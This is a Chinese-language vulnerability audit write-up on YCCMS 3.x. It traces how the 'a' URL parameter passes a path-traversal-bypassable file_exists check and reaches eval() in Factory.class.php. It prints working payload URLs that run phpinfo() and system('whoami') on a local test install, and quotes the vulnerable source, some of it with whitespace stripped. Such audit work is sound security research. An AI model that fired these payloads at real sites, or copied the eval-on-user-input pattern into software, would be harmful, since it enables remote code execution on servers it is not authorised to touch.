# yccms 3.0代码执行审计过程

## 0x01

环境搭建

    
    
    使用版本为php5.5.38

网站搭建成![1636254276_61874244bbca028a64f1b.png!small?1636254276948](https://image.3001.net/images/20211107/1636254276_61874244bbca028a64f1b.png!small?1636254276948)

## 0x02 代码审计

    
    
    漏洞点位置/public/class/Factory.class.php

<http://127.0.0.1/YCCMS3.3/admin/?a=admin>  

    
    
    漏洞利用:  
    http://127.0.0.1/YCCMS3.3/admin/index.php?a=Factory();phpinfo();//../

![1636254294_6187425666eca9e884f11.png!small?1636254294533](https://image.3001.net/images/20211107/1636254294_6187425666eca9e884f11.png!small?1636254294533)

 **以下是相关的分析过程:**

/admin/index.php

    
    
    <?php  
    requirestr_replace('\\','/',substr(dirname(__FILE__),0,-6)).'/config/run.inc.php';  
    ?>

跟踪进入：run.inc.php

    
    
    requireROOT_PATH.'/config/config.inc.php';  
    //引入Smarty  
    requireROOT_PATH.'/public/smarty/Smarty.class.php';  
    //自动加载类  
    function_autoload($className){  
    if(substr($className,-6)=='Action'){  
    requireROOT_PATH.'/controller/'.$className.'.class.php';  
    }elseif(substr($className, -5) =='Model'){  
    requireROOT_PATH.'/model/'.$className.'.class.php';  
    }else{  
    requireROOT_PATH.'/public/class/'.$_className.'.class.php';  
    }  
    }  
    //单入口  
    Factory::setAction()->run();//此段代码的意思是调用factory中的setaction方法那么我们  
    ?>

本页面代码前面主要进行初始化一些常量和配置，其中autoload函数作用是当你进行初始化类在本页面不存在时候就会自动调用autoload（）函数，同时会把名字当做参数传输过去

Factory::setAction()->run();根据此函数可以知道此处调用了factory类中的setAction方法，此处是静态调用

那么我们继续追踪factory类

> 进一步追踪 /public/class/Factory.class.php
    
    
    <?php  
    classFactory{  
    staticprivate$_obj=null;//static 关键字来定义静态方法和属性 private表示的是私有的  
    staticpublicfunctionsetAction(){  
    $_a=self::getA();  
    if(in_array($_a, array('admin', 'nav', 'article','backup','html','link','pic','search','system','xml','online'))) {  
    if(!isset($_SESSION['admin'])) {  
    header('Location:'.'?a=login');  
    }  
    }  
    if(!file_exists(ROOT_PATH.'/controller/'.$_a.'Action.class.php')) $_a='Index';  
    eval('self::$_obj = new '.ucfirst($_a).'Action();');//ucfirst 将$_a传参内的首个字母传化为大写 (self::$_obj=new factory();//../Action();)  
    returnself::$_obj;在这儿加入传入a=Factory();//../  
          self::$_obj=newFactory();phpinfo();//echo Action();  
          self::$_obj=newFactory();system('whoami');//../Action();  
    }  
      
    staticpublicfunctionsetModel() {  
    $_a=self::getA();  
    if(file_exists(ROOT_PATH.'/model/'.$_a.'Model.class.php')) eval('self::$_obj = new '.ucfirst($_a).'Model();');  
    returnself::$_obj;  
    }  
    staticpublicfunctiongetA(){  
    if(isset($_GET['a']) &&!empty($_GET['a'])){  
    return$_GET['a'];  
    }  
    return'login';  
    }  
    }  
    ?>
    
    
    if(!file_exists(ROOT_PATH.'/controller/'.$_a.'Action.class.php')) $_a='Index';  
    eval('self::$obj = new '.ucfirst($_a).'Action();');//ucfirst 将$a传参内的首个字母传化为大写 (self::$obj=new factory();//../Action();)  
    ​  
    在file_exits函数中存在../逃逸绕过而在此if判断语句中，如果!file_exists(ROOT_PATH.'/controller/'.$_a.'Action.class.php')为ture那么$_a将被赋值index  
      所以我们不能让其条件为真，那么根据分析可以知道/controller/Action.class.php文件存在的  
      所以我们要传入$_a=a/../这样的话那么拼接的是/controller/a/../Action.class.php这个文件是存在的  
      所以根据这个语法规则是可以绕过该语法规则  
    eval('self::$obj = new '.ucfirst($_a).'Action();')  
      在此处存在$_a是我们可控的参数,eval指的是任意代码执行self::$obj指的是实例化一个类  
          ucfirst传入参数的第一个字母大写  
          那么在这里我们就可以尝试构建函数进行拼接  
          factory;phpinfo();//../因为该目录为Index.php引用

所以在<http://127.0.0.1/YCCMS3.3/admin/index.php?a=Factory();phpinfo();//../>  

![1636254300_6187425c7d2711b26a8ff.png!small?1636254300655](https://image.3001.net/images/20211107/1636254300_6187425c7d2711b26a8ff.png!small?1636254300655)

